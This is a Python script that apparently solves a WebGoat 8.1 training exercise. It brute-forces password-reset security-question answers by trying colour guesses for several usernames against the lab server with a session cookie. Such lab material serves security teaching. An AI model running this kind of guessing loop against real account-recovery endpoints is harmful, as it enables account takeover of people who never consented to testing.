#!/usr/bin/env python3

"""
Bruteforce script to guess user's secret question for WebGoat 8.1 
Broken Authentication - Password reset - #4

Use requests library - https://requests.readthedocs.io/en/master/

"""

import requests
import re
import json

colors = ['black', 'blue', 'brown', 'purple', 'red', 'yellow', 'green']
users = ['tom', 'admin', 'larry']

WebGoatIP = 'http://192.168.195.157:8080' #FIXME
JSESSIONID = 'vIB9YWPRkpBgQLcYNtGo70n13ysf9HzhrKh15qRf' #FIXME find a valid session id after login

httpHeaders = {
        'Host': WebGoatIP,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': '{WebGoatIP}/WebGoat/start.mvc',
        'X-Requested-With': 'XMLHttpRequest',
        'Cookie': f'JSESSIONID={JSESSIONID}',
        'Connection': 'keep-alive',
    }


# Runt this for to find the ip of webgoat-prd server
def bruteForce():
    combinations = []
    action = f'{WebGoatIP}/WebGoat/PasswordReset/questions'
    for user in users:
        for color in colors:
            formData = {'username': user,
                        'securityQuestion': color
                        }
            res = requests.post(action, data=formData, headers=httpHeaders)
            response = res.text
            #print(response)
            if response.find('Congratulations') >= 0:
                combinations.append((user, color))  
    print(combinations)


if __name__ == "__main__":
    bruteForce()